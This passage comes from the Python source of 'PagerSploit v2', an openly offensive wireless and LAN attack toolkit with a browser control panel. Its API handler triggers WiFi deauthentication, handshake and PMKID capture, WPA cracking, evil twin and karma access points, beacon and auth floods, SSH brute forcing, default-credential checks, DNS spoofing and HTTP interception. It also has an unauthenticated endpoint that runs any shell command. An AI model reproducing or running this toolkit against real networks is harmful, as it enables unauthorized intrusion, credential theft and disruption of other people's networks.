              'ns1','ns2','mx','remote','portal','dashboard','app','shop','cdn','static','login',
              'secure','m','mobile','beta','git','jenkins','jira','confluence','gitlab','wiki']
    found=[]
    for sub in subs:
        fqdn=f'{sub}.{domain}'
        try:
            ip=socket.gethostbyname(fqdn)
            found.append({'subdomain':fqdn,'ip':ip}); log(f'Found: {fqdn} -> {ip}','success')
        except: pass
    save_loot('scans',f'dnsbrute_{domain}_{ts()}.json',json.dumps(found,indent=2))
    if found:
        with STATE_LOCK: STATE['loot_count']+=1
    set_data('dns_brute',found)
    log(f'DNS brute {domain}: {len(found)} found','success'); set_module('idle',f'{len(found)} subdomains')
    return found

def osint_wifi_geolocate(bssids):
    log(f'WiFi geo: {len(bssids)} BSSIDs','info'); set_module('WiFi Geo',f'{len(bssids)} APs')
    payload=json.dumps({'wifiAccessPoints':[{'macAddress':b} for b in bssids[:10]]}).encode()
    result={'bssids':bssids}
    try:
        req=urllib.request.Request('https://location.services.mozilla.com/v1/geolocate?key=geoclue',
            data=payload,headers={'Content-Type':'application/json','User-Agent':'PagerSploit'})
        data=json.loads(urllib.request.urlopen(req,timeout=10).read(512).decode())
        result.update(data)
        loc=data.get('location',{})
        log(f'WiFi geo: {loc.get("lat","?")} {loc.get("lng","?")} acc={data.get("accuracy","?")}m','success')
    except Exception as e: result['error']=str(e); log(f'WiFi geo: {e}','error')
    set_data('wifi_geo',result); set_module('idle','Geo done'); return result

def osint_http_fingerprint(target, port=80):
    log(f'HTTP fp: {target}:{port}','info'); set_module('HTTP Scan',f'{target}:{port}')
    proto='https' if port in [443,8443] else 'http'
    result={'target':target,'port':port,'headers':{},'tech':[]}
    try:
        req=urllib.request.Request(f'{proto}://{target}:{port}/',headers={'User-Agent':'Mozilla/5.0'})
        resp=urllib.request.urlopen(req,timeout=8)
        result['status']=resp.status; result['headers']=dict(resp.headers)
        body=resp.read(4096).decode('utf-8',errors='replace')
        h=str(result['headers']).lower()
        for tech,sig in [('WordPress','wp-content'),('Joomla','Joomla'),('Drupal','Drupal'),
                ('phpMyAdmin','phpMyAdmin'),('Jenkins','Jenkins'),('cPanel','cPanel'),
                ('Apache','Apache'),('nginx','nginx'),('IIS','Microsoft-IIS'),
                ('PHP','PHP'),('ASP.NET','ASP.NET'),('jQuery','jquery')]:
            if sig.lower() in body.lower() or sig.lower() in h: result['tech'].append(tech)
        log(f'HTTP {target}: {resp.status} tech={result["tech"]}','success')
    except Exception as e: result['error']=str(e); log(f'HTTP fp: {e}','error')
    set_data('http_headers',result)
    save_loot('scans',f'http_{target}_{ts()}.json',json.dumps(result,indent=2))
    set_module('idle','HTTP done'); return result

def osint_sysrecon():
    log('Sys recon...','info'); set_module('Sys Recon','Gathering...')
    result={}
    result['interfaces']=run_cmd(['ip','addr','show'],timeout=5)
    result['iwconfig']=run_cmd(['iwconfig'],timeout=5)
    result['br_lan_clients']=run_cmd(['arp','-n','-i','br-lan'],timeout=5)
    result['br_evil_clients']=run_cmd(['arp','-n','-i','br-evil'],timeout=5)
    result['routes']=run_cmd(['ip','route'],timeout=5)
    result['disk']=run_cmd(['df','-h'],timeout=5)
    result['processes']=run_cmd(['ps','aux'],timeout=5)
    result['nftables']=run_cmd(['nft','list','ruleset'],timeout=5)
    for lf in ['/tmp/dhcp.leases','/var/lib/misc/dnsmasq.leases']:
        if os.path.exists(lf):
            try:
                with open(lf) as f: result['dhcp_leases']=f.read()
            except: pass
    save_loot('scans',f'sysrecon_{ts()}.json',json.dumps(result,indent=2))
    set_data('sysrecon',result)
    log('Sys recon done','success'); set_module('idle','Recon done'); return result

# ── Loot / Wordlists ──────────────────────────────────────────────────────
def get_loot_list():
    loot=[]
    for root,dirs,files in os.walk(loot_path()):
        for f in files:
            path=os.path.join(root,f)
            try:
                st=os.stat(path)
                loot.append({'name':f,'path':path,'category':os.path.basename(root),
                    'size':st.st_size,'modified':datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')})
            except: pass
    loot.sort(key=lambda x: x['modified'],reverse=True)
    return loot

def get_wordlists():
    lists=[]
    for d in [os.path.normpath(loot_path('..','wordlists')),'/root/loot/wordlists','/mmc/wordlists','/root/wordlists']:
        if os.path.isdir(d):
            for f in os.listdir(d):
                if f.endswith(('.txt','.lst','.gz')):
                    path=os.path.join(d,f)
                    lists.append({'name':f,'path':path,'size':os.path.getsize(path)})
    return lists


# ── API Handler ───────────────────────────────────────────────────────────
class APIHandler(BaseHTTPRequestHandler):
    timeout = 10
    def log_message(self,*a): pass
    def send_json(self,data,code=200):
        body=json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type','application/json')
        self.send_header('Content-Length',len(body))
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Connection','close')
        self.end_headers(); self.wfile.write(body)
    def send_html(self,html):
        body=html.encode() if isinstance(html,str) else html
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Content-Length',len(body))
        self.send_header('Connection','close')
        self.end_headers(); self.wfile.write(body)
    def get_body(self):
        length=int(self.headers.get('Content-Length',0))
        if length:
            raw=self.rfile.read(length).decode('utf-8',errors='replace')
            try: return json.loads(raw)
            except: return {}
        return {}
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Access-Control-Allow-Methods','GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers','Content-Type')
        self.end_headers()
    def do_GET(self):
        path=urlparse(self.path).path
        if path=='/api/ping':
            self.send_json({'pong': True, 'module': STATE['active_module']}); return
        if path in ('/','index.html'): self.send_html(get_ui_html()); return
        if path=='/api/state':
            with STATE_LOCK:
                s={k:v for k,v in STATE.items() if k not in ('module_data',)}
                s['jobs']=list(STATE['jobs'].keys())
                s['stop_events']=list(STATE['stop_events'].keys())
            self.send_json(s); return
        if path=='/api/log':
            with STATE_LOCK: self.send_json(list(STATE['log'][-150:]))
            return
        if path=='/api/scans':
            with STATE_LOCK: self.send_json(list(STATE['scan_results']))
            return
        if path=='/api/hosts':
            with STATE_LOCK: self.send_json(list(STATE['hosts']))
            return
        if path=='/api/loot': self.send_json(get_loot_list()); return
        if path=='/api/wordlists': self.send_json(get_wordlists()); return
        if path=='/api/portals':
            d=os.path.join(get_payload_dir(),'portals')
            self.send_json([f for f in os.listdir(d) if f.endswith('.html')] if os.path.isdir(d) else [])
            return
        if path.startswith('/api/data/'):
            self.send_json(get_data(path[len('/api/data/'):],{})); return
        if path.startswith('/api/loot/download/'):
            fname=unquote_plus(path[len('/api/loot/download/'):])
            item=next((l for l in get_loot_list() if l['name']==fname),None)
            if item and os.path.exists(item['path']):
                with open(item['path'],'rb') as f: data=f.read()
                self.send_response(200)
                self.send_header('Content-Disposition',f'attachment; filename="{fname}"')
                self.send_header('Content-Length',len(data))
                self.end_headers(); self.wfile.write(data)
            else: self.send_json({'error':'not found'},404)
            return
        self.send_json({'error':'not found'},404)

    def do_POST(self):
        path=urlparse(self.path).path
        b=self.get_body()
        def req(field,err='required'):
            v=b.get(field,'')
            if not v: self.send_json({'error':f'{field} {err}'},400); return None
            return v

        if path=='/api/wifi/scan':
            start_job('wifi_scan',wifi_scan); self.send_json({'status':'scanning'})
        elif path=='/api/wifi/deauth':
            bssid=b.get('bssid','')
            if bssid: wifi_deauth(bssid,str(b.get('channel','6')),str(b.get('count','0')),b.get('client','FF:FF:FF:FF:FF:FF')); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/capture':
            bssid=b.get('bssid','')
            if bssid: _,cap=wifi_capture(bssid,str(b.get('channel','6')),b.get('ssid','capture')); self.send_json({'status':'started','file':cap})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/crack':
            c,w=b.get('cap_file',''),b.get('wordlist','')
            if c and w: wifi_crack(c,w); self.send_json({'status':'started'})
            else: self.send_json({'error':'cap_file and wordlist required'},400)
        elif path=='/api/wifi/probe_harvest':
            wifi_probe_harvest(int(b.get('duration',60))); self.send_json({'status':'started'})
        elif path=='/api/wifi/beacon_flood':
            ssids=b.get('ssids',['Free WiFi'])
            if isinstance(ssids,str): ssids=[s.strip() for s in ssids.split('\n') if s.strip()]
            wifi_beacon_flood(ssids); self.send_json({'status':'started','count':len(ssids)})
        elif path=='/api/wifi/wps_scan':
            start_job('wps_scan',wifi_wps_scan); self.send_json({'status':'scanning'})
        elif path=='/api/wifi/karma':
            wifi_karma(str(b.get('channel','6')),b.get('ssids',[])); self.send_json({'status':'started'})
        elif path=='/api/wifi/auth_flood':
            bssid=b.get('bssid','')
            if bssid: wifi_auth_flood(bssid,str(b.get('channel','6'))); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/evil_twin':
            ssid=b.get('ssid',''); portal=b.get('portal')
            if portal: portal=os.path.join(get_payload_dir(),'portals',portal)
            if ssid: wifi_evil_twin(ssid,str(b.get('channel','6')),portal); self.send_json({'status':'started'})
            else: self.send_json({'error':'ssid required'},400)
        elif path=='/api/wifi/channel_hop':
            wifi_channel_hop(str(b.get('band','2'))); self.send_json({'status':'started'})
        elif path=='/api/wifi/pmkid':
            bssid=b.get('bssid','')
            if bssid: wifi_pmkid(bssid,str(b.get('channel','6'))); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/lan/arp_scan':
            start_job('arp_scan',lan_arp_scan,b.get('subnet','172.16.52.0/24')); self.send_json({'status':'started'})
        elif path=='/api/lan/port_scan':
            t=b.get('target','')
            if t: start_job('port_scan',lan_port_scan,t,b.get('ports','1-1024')); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/service_scan':
            t=b.get('target','')
            if t: start_job('service_scan',lan_service_scan,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/os_detect':
            t=b.get('target','')
            if t: start_job('os_detect',lan_os_detect,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/banner_grab':
            t=b.get('target','')
            if t: start_job('banner_grab',lan_banner_grab,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ping_sweep':
            start_job('ping_sweep',lan_ping_sweep,b.get('subnet','172.16.52.0/24')); self.send_json({'status':'started'})
        elif path=='/api/lan/default_creds':
            t=b.get('target','')
            if t: start_job('default_creds',lan_default_creds,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ssh_brute':
            t=b.get('target','')
            if t: start_job('ssh_brute',lan_ssh_brute,t,int(b.get('port',22))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/smb_enum':
            t=b.get('target','')
            if t: start_job('smb_enum',lan_smb_enum,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/snmp_walk':
            t=b.get('target','')
            if t: start_job('snmp_walk',lan_snmp_walk,t,b.get('community','public')); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ssl_cert':
            t=b.get('target','')
            if t: start_job('ssl_cert',lan_ssl_cert,t,int(b.get('port',443))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/mdns':
            start_job('mdns',lan_mdns_discover); self.send_json({'status':'started'})
        elif path=='/api/lan/dns_spoof':
            d,r=b.get('domain',''),b.get('redirect','')
            if d and r: lan_dns_spoof(d,r); self.send_json({'status':'active','domain':d})
            else: self.send_json({'error':'domain and redirect required'},400)
        elif path=='/api/lan/http_intercept':
            lan_http_intercept(b.get('iface','wlan0')); self.send_json({'status':'started'})
        elif path=='/api/osint/mac':
            m=b.get('mac','')
            if m: start_job('mac_lookup',osint_mac_lookup,m); self.send_json({'status':'started'})
            else: self.send_json({'error':'mac required'},400)
        elif path=='/api/osint/ipgeo':
            ip=b.get('ip','')
            if ip: start_job('ipgeo',osint_ip_geo,ip); self.send_json({'status':'started'})
            else: self.send_json({'error':'ip required'},400)
        elif path=='/api/osint/whois':
            t=b.get('target','')
            if t: start_job('whois',osint_whois,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/osint/dns_enum':
            d=b.get('domain','')
            if d: start_job('dns_enum',osint_dns_enum,d); self.send_json({'status':'started'})
            else: self.send_json({'error':'domain required'},400)
        elif path=='/api/osint/dns_brute':
            d=b.get('domain','')
            if d: start_job('dns_brute',osint_dns_bruteforce,d,b.get('wordlist')); self.send_json({'status':'started'})
            else: self.send_json({'error':'domain required'},400)
        elif path=='/api/osint/wifi_geo':
            bssids=b.get('bssids',[])
            if not bssids:
                with STATE_LOCK: bssids=[a['bssid'] for a in STATE['scan_results'][:10]]
            if bssids: start_job('wifi_geo',osint_wifi_geolocate,bssids); self.send_json({'status':'started'})
            else: self.send_json({'error':'run scan first'},400)
        elif path=='/api/osint/http_headers':
            t=b.get('target','')
            if t: start_job('http_fp',osint_http_fingerprint,t,int(b.get('port',80))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/osint/sysrecon':
            start_job('sysrecon',osint_sysrecon); self.send_json({'status':'started'})
        elif path=='/api/stop':
            self.send_json({'status':'stopped' if stop_module(b.get('module','')) else 'not found'})
        elif path=='/api/stop_all':
            with STATE_LOCK:
                for ev in list(STATE['stop_events'].values()): ev.set()
                for proc in list(STATE['jobs'].values()):
                    if hasattr(proc,'terminate'):
                        try: proc.terminate()
                        except: pass
                STATE['stop_events'].clear(); STATE['jobs'].clear()
            set_module('idle','All stopped'); self.send_json({'status':'all stopped'})
        elif path=='/api/term/exec':
            cmd = b.get('cmd','').strip()
            if not cmd:
                self.send_json({'error':'no command'}); return
            log(f'$ {cmd}', 'info')
            try:
                proc = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, env={**os.environ, 'PATH': '/mmc/usr/bin:/mmc/usr/sbin:/usr/bin:/usr/sbin:/bin:/sbin'}
                )
                try:
                    out, _ = proc.communicate(timeout=30)
                except subprocess.TimeoutExpired:
                    proc.kill(); out, _ = proc.communicate()
                    out = out + '\n[TIMEOUT after 30s]'
                log(f'exit {proc.returncode}', 'info')
                self.send_json({'output': out, 'rc': proc.returncode})
            except Exception as e:
                self.send_json({'error': str(e), 'output': ''})
        else:
            self.send_json({'error':'unknown endpoint'},404)


# ── Pager Display ─────────────────────────────────────────────────────────
def rgb(r,g,b): return ((r&0xF8)<<8)|((g&0xFC)<<3)|(b>>3)
C_BG=rgb(4,4,12); C_TITLE=rgb(0,255,180); C_GREEN=rgb(0,255,80)
C_RED=rgb(255,40,40); C_YELLOW=rgb(255,220,0); C_WHITE=rgb(220,220,220)
C_DIM=rgb(70,70,70); C_ORANGE=rgb(255,140,0)

def pager_display_loop(p, stop_event):
    p.set_rotation(270)
    BTN_B = Pager.BTN_B
    while not stop_event.is_set():
        try:
            with STATE_LOCK:
                module   = STATE['active_module']
                status   = STATE['module_status']
                loot     = STATE['loot_count']
                ip       = STATE['server_ip']
                port     = STATE['server_port']
                last_log = STATE['log'][-1] if STATE['log'] else None
                jobs     = list(STATE['stop_events'].keys())
            p.fill_rect(0,0,480,222,C_BG)
            p.fill_rect(0,0,480,18,rgb(0,30,20))
            p.draw_text(4,2,'PAGERSPLOIT v2',C_TITLE,1)
            p.fill_rect(0,18,480,1,C_TITLE)
            p.fill_rect(4,24,472,34,rgb(0,15,10))
            p.draw_text(8,28,'CONNECT:',C_DIM,1)
            p.draw_text(68,28,f'http://{ip}:{port}',C_GREEN,1)
            p.draw_text(8,40,'USB-C ethernet or management AP',C_DIM,1)
            p.fill_rect(4,58,472,1,C_DIM)
            p.draw_text(8,64,'MODULE:',C_DIM,1)
            p.draw_text(68,64,module.upper()[:30],C_ORANGE if module!='idle' else C_DIM,1)
            p.draw_text(8,76,'STATUS:',C_DIM,1)
            p.draw_text(68,76,status[:34],C_WHITE,1)
            p.draw_text(8,90,'LOOT:',C_DIM,1)
            p.draw_text(52,90,str(loot),C_YELLOW,1)
            if last_log:
                col={'success':C_GREEN,'error':C_RED,'warn':C_ORANGE}.get(last_log['level'],C_WHITE)
                p.fill_rect(4,102,472,1,C_DIM)
                p.draw_text(8,106,f"[{last_log['time']}] {last_log['msg'][:45]}",col,1)
            if jobs:
                p.fill_rect(4,120,472,1,C_DIM)
                p.draw_text(8,124,' | '.join(jobs[:4])[:48],C_ORANGE,1)
            p.fill_rect(0,208,480,1,C_DIM)
            p.draw_text(4,210,'Browser UI active',C_DIM,1)
            p.draw_text(370,210,'B=Shutdown',C_RED,1)
            p.flip()
            _,pressed,_ = p.poll_input()
            if pressed & BTN_B:
                stop_event.set(); break
        except Exception as e:
            print(f'display: {e}',flush=True)
        time.sleep(0.3)


# ── Web UI HTML ───────────────────────────────────────────────────────────
def get_ui_html():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>PagerSploit</title>
<style>
:root{--bg:#04040c;--panel:#080818;--border:#00ffb4;--text:#dcdcdc;--dim:#555;
  --green:#00ff50;--red:#ff2828;--yellow:#ffdc00;--orange:#ff8c00;
  --blue:#00b4ff;--title:#00ffb4;--purple:#c060ff}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:"Courier New",monospace;font-size:13px}
#app{display:flex;height:100vh;overflow:hidden}
#sidebar{width:210px;min-width:210px;background:var(--panel);border-right:1px solid #111;display:flex;flex-direction:column;overflow-y:auto}
#sidebar-header{padding:12px 10px;border-bottom:1px solid var(--border);color:var(--title);font-size:14px;font-weight:bold;letter-spacing:2px}
#sidebar-header span{font-size:10px;color:var(--dim);display:block;margin-top:2px}
.nav-group{padding:5px 0;border-bottom:1px solid #0c0c1a}
.nav-group-title{padding:4px 10px;font-size:10px;color:var(--dim);letter-spacing:1px}
.nav-item{padding:5px 14px;cursor:pointer;color:var(--dim);border-left:2px solid transparent;font-size:12px}
.nav-item:hover{color:var(--text);background:#0a0a1a}
.nav-item.active{color:var(--title);border-left-color:var(--title);background:#050518}
#status-bar{padding:8px 10px;border-top:1px solid #111;font-size:11px;color:var(--dim);margin-top:auto}
#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
#topbar{padding:7px 16px;background:var(--panel);border-bottom:1px solid #111;display:flex;align-items:center;justify-content:space-between}
#topbar h2{color:var(--title);font-size:13px;letter-spacing:1px}
#content{flex:1;overflow-y:auto;padding:14px}
#log-bar{height:88px;background:#020208;border-top:1px solid #111;overflow-y:auto;padding:4px 10px;font-size:11px}
.panel{background:var(--panel);border:1px solid #111;border-radius:3px;margin-bottom:12px}
.panel-title{padding:7px 12px;border-bottom:1px solid #111;color:var(--blue);font-size:11px;letter-spacing:1px}
.panel-body{padding:12px}
.form-row{margin-bottom:9px}
.form-row label{display:block;color:var(--dim);font-size:11px;margin-bottom:3px}
input,select,textarea{background:#06060f;border:1px solid #222;color:var(--text);padding:5px 8px;border-radius:2px;font-family:monospace;font-size:12px;width:100%}
input:focus,select:focus,textarea:focus{outline:none;border-color:var(--border)}
.btn{padding:6px 14px;border:1px solid;border-radius:2px;cursor:pointer;font-family:monospace;font-size:12px;background:transparent}
.btn-green{color:var(--green);border-color:var(--green)}
.btn-red{color:var(--red);border-color:var(--red)}
.btn-yellow{color:var(--yellow);border-color:var(--yellow)}
.btn-orange{color:var(--orange);border-color:var(--orange)}
.btn-blue{color:var(--blue);border-color:var(--blue)}
.btn-purple{color:var(--purple);border-color:var(--purple)}
.btn:hover{opacity:.75;background:rgba(255,255,255,.03)}
.btn-sm{padding:2px 9px;font-size:11px}
table{width:100%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:5px 8px;color:var(--dim);border-bottom:1px solid #111;font-weight:normal;font-size:11px}
td{padding:5px 8px;border-bottom:1px solid #0a0a18}
tr:hover td{background:#0a0a18}
.tag{display:inline-block;padding:1px 6px;border-radius:2px;font-size:10px}
.tag-green{background:#001a08;color:var(--green);border:1px solid #003010}
.tag-red{background:#1a0000;color:var(--red);border:1px solid #300000}
.tag-yellow{background:#1a1400;color:var(--yellow);border:1px solid #302800}
.tag-blue{background:#001020;color:var(--blue);border:1px solid #002040}
.tag-orange{background:#1a0800;color:var(--orange);border:1px solid #302000}
.tag-purple{background:#100018;color:var(--purple);border:1px solid #200030}
.log-info{color:var(--dim)}.log-success{color:var(--green)}.log-error{color:var(--red)}.log-warn{color:var(--orange)}
.sig{display:inline-block;width:38px;height:7px;background:#111;border-radius:2px;vertical-align:middle}
.sig-fill{height:100%;border-radius:2px}
.hidden{display:none}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
pre.out{color:var(--green);font-size:11px;max-height:280px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.rbox{background:#020210;border:1px solid #111;border-radius:2px;padding:10px;margin-top:8px;font-size:11px;max-height:260px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
@media(max-width:700px){.grid-2{grid-template-columns:1fr}#sidebar{display:none}}
</style></head>
<body>
<div id="app">
<div id="sidebar">
  <div id="sidebar-header">PAGERSPLOIT<span>v2.0 // wickedNull</span></div>
  <div class="nav-group">
    <div class="nav-group-title">DASHBOARD</div>
    <div class="nav-item active" onclick="show(\'dashboard\')">&#9632; Overview</div>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">WIFI ATTACKS</div>
    <div class="nav-item" onclick="show(\'wifi-scan\')">&#9670; AP Scanner</div>
    <div class="nav-item" onclick="show(\'wifi-deauth\')">&#9670; Deauth</div>
    <div class="nav-item" onclick="show(\'wifi-capture\')">&#9670; Handshake Capture</div>
    <div class="nav-item" onclick="show(\'wifi-crack\')">&#9670; WPA Crack</div>
    <div class="nav-item" onclick="show(\'wifi-pmkid\')">&#9670; PMKID Capture</div>
    <div class="nav-item" onclick="show(\'wifi-evil-twin\')">&#9670; Evil Twin</div>
    <div class="nav-item" onclick="show(\'wifi-karma\')">&#9670; Karma Attack</div>
    <div class="nav-item" onclick="show(\'wifi-beacon\')">&#9670; Beacon Flood</div>
    <div class="nav-item" onclick="show(\'wifi-probe\')">&#9670; Probe Harvest</div>
    <div class="nav-item" onclick="show(\'wifi-auth-flood\')">&#9670; Auth Flood</div>
    <div class="nav-item" onclick="show(\'wifi-wps\')">&#9670; WPS Scan</div>
    <div class="nav-item" onclick="show(\'wifi-chanhop\')">&#9670; Channel Hop</div>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">LAN ATTACKS</div>
    <div class="nav-item" onclick="show(\'lan-arp\')">&#9670; ARP Scan</div>
    <div class="nav-item" onclick="show(\'lan-ping\')">&#9670; Ping Sweep</div>
    <div class="nav-item" onclick="show(\'lan-portscan\')">&#9670; Port Scan</div>
    <div class="nav-item" onclick="show(\'lan-servicescan\')">&#9670; Service Scan</div>
    <div class="nav-item" onclick="show(\'lan-os\')">&#9670; OS Detection</div>
    <div class="nav-item" onclick="show(\'lan-banner\')">&#9670; Banner Grab</div>
    <div class="nav-item" onclick="show(\'lan-creds\')">&#9670; Default Creds</div>
    <div class="nav-item" onclick="show(\'lan-ssh\')">&#9670; SSH Brute</div>
    <div class="nav-item" onclick="show(\'lan-smb\')">&#9670; SMB Enum</div>
    <div class="nav-item" onclick="show(\'lan-snmp\')">&#9670; SNMP Walk</div>
    <div class="nav-item" onclick="show(\'lan-ssl\')">&#9670; SSL Cert</div>
    <div class="nav-item" onclick="show(\'lan-mdns\')">&#9670; mDNS Discovery</div>
    <div class="nav-item" onclick="show(\'lan-dns-spoof\')">&#9670; DNS Spoof</div>
    <div class="nav-item" onclick="show(\'lan-http\')">&#9670; HTTP Intercept</div>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">OSINT</div>
    <div class="nav-item" onclick="show(\'osint-mac\')">&#9670; MAC Lookup</div>
    <div class="nav-item" onclick="show(\'osint-ipgeo\')">&#9670; IP Geolocation</div>
    <div class="nav-item" onclick="show(\'osint-whois\')">&#9670; WHOIS</div>
    <div class="nav-item" onclick="show(\'osint-dns\')">&#9670; DNS Enum</div>
    <div class="nav-item" onclick="show(\'osint-dnsbrute\')">&#9670; DNS Brute</div>
    <div class="nav-item" onclick="show(\'osint-wifigeo\')">&#9670; WiFi Geolocate</div>
    <div class="nav-item" onclick="show(\'osint-http\')">&#9670; HTTP Fingerprint</div>
    <div class="nav-item" onclick="show(\'osint-sysrecon\')">&#9670; System Recon</div>
  </div>
  <div class="nav-group">
    <div class="nav-group-title">LOOT</div>
    <div class="nav-item" onclick="show(\'loot\')">&#9670; Loot Manager</div>
  <div class="nav-group">
    <div class="nav-group-title">SYSTEM</div>
    <div class="nav-item" onclick="show('terminal')">&#9654; Terminal</div>
  </div>
  </div>
  <div id="status-bar">Module: <span style="color:var(--orange)" id="sb-mod">idle</span><br>
    <span id="sb-status" style="color:#444">Standing by</span></div>
</div>
<div id="main">
  <div id="topbar">
    <h2 id="page-title">OVERVIEW</h2>
    <div style="font-size:11px;color:var(--dim)">
      <span id="tb-ip">172.16.52.1:8080</span> &nbsp;|&nbsp;
      Loot: <span style="color:var(--yellow)" id="tb-loot">0</span> &nbsp;
      <button class="btn btn-red btn-sm" onclick="stopAll()">&#9632; STOP ALL</button>
    </div>
  </div>
  <div id="content">

  <div id="page-dashboard" class="page">
    <div class="grid-2">
      <div class="panel"><div class="panel-title">STATUS</div><div class="panel-body">
        <table>
          <tr><td style="color:var(--dim)">Server</td><td id="d-ip" style="color:var(--green)">-</td></tr>
          <tr><td style="color:var(--dim)">Module</td><td id="d-mod" style="color:var(--orange)">idle</td></tr>
          <tr><td style="color:var(--dim)">Status</td><td id="d-status">-</td></tr>
          <tr><td style="color:var(--dim)">Jobs</td><td id="d-jobs" style="color:var(--yellow)">0</td></tr>
          <tr><td style="color:var(--dim)">Loot</td><td id="d-loot" style="color:var(--yellow)">0</td></tr>
        </table>
      </div></div>
      <div class="panel"><div class="panel-title">QUICK ACTIONS</div><div class="panel-body">
        <button class="btn btn-blue" style="width:100%;margin-bottom:6px" onclick="show(\'wifi-scan\');doScan()">&#9670; Scan APs</button>
        <button class="btn btn-blue" style="width:100%;margin-bottom:6px" onclick="show(\'lan-arp\');doArp()">&#9670; ARP Scan LAN</button>
        <button class="btn btn-purple" style="width:100%;margin-bottom:6px" onclick="show(\'osint-sysrecon\');doSysRecon()">&#9670; System Recon</button>
        <button class="btn btn-red" style="width:100%" onclick="stopAll()">&#9632; Stop All</button>
      </div></div>
    </div>
    <div class="panel"><div class="panel-title">LAST SCAN <span id="d-ap-count" style="color:var(--dim)"></span></div>
      <div class="panel-body" style="max-height:200px;overflow-y:auto">
        <table><thead><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>ENC</th><th>CLIENTS</th><th>SIG</th><th></th></tr></thead>
        <tbody id="d-ap-body"><tr><td colspan="7" style="color:var(--dim)">No scan data</td></tr></tbody></table>
      </div></div>
  </div>

  <div id="page-wifi-scan" class="page hidden">
    <div class="panel"><div class="panel-title">AP SCANNER</div><div class="panel-body">
      <button class="btn btn-green" onclick="doScan()">&#9670; Scan Now</button>
      <button class="btn btn-orange" onclick="doWifiGeo()" style="margin-left:8px">&#9670; Geolocate Results</button>
      <span id="scan-status" style="color:var(--dim);margin-left:12px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">RESULTS <span id="scan-count" style="color:var(--dim)"></span></div>
      <div class="panel-body" style="overflow-x:auto">
        <table><thead><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>ENC</th><th>CLIENTS</th><th>SIG</th><th>ACTIONS</th></tr></thead>
        <tbody id="scan-body"><tr><td colspan="7" style="color:var(--dim)">Click Scan Now</td></tr></tbody></table>
      </div></div>
  </div>

  <div id="page-wifi-deauth" class="page hidden">
    <div class="panel"><div class="panel-title">DEAUTH ATTACK</div><div class="panel-body">
      <div class="form-row"><label>BSSID</label><input id="da-bssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
      <div class="form-row"><label>Channel</label><input id="da-ch" value="6" style="width:80px"></div>
      <div class="form-row"><label>Client (FF:FF:FF:FF:FF:FF = broadcast)</label><input id="da-client" value="FF:FF:FF:FF:FF:FF"></div>
      <div class="form-row"><label>Count (0=continuous)</label><input id="da-count" value="0" style="width:80px"></div>
      <button class="btn btn-red" onclick="doDeauth()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'deauth\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-wifi-capture" class="page hidden">
    <div class="panel"><div class="panel-title">HANDSHAKE CAPTURE</div><div class="panel-body">
      <div class="form-row"><label>BSSID</label><input id="cap-bssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
      <div class="form-row"><label>SSID</label><input id="cap-ssid" placeholder="TargetNetwork"></div>
      <div class="form-row"><label>Channel</label><input id="cap-ch" value="6" style="width:80px"></div>
      <button class="btn btn-green" onclick="doCapture()">&#9670; Capture</button>
      <button class="btn btn-orange" onclick="doCapDeauth()" style="margin-left:8px">&#9670; Capture + Deauth</button>
      <button class="btn btn-yellow" onclick="stop(\'capture\')" style="margin-left:8px">&#9632; Stop</button>
      <p id="cap-status" style="color:var(--dim);margin-top:8px"></p>
    </div></div>
  </div>

  <div id="page-wifi-crack" class="page hidden">
    <div class="panel"><div class="panel-title">WPA CRACK</div><div class="panel-body">
      <div class="form-row"><label>Cap File</label><select id="crack-cap"></select></div>
      <div class="form-row"><label>Wordlist</label><select id="crack-wl"></select></div>
      <button class="btn btn-red" onclick="doCrack()">&#9670; Crack</button>
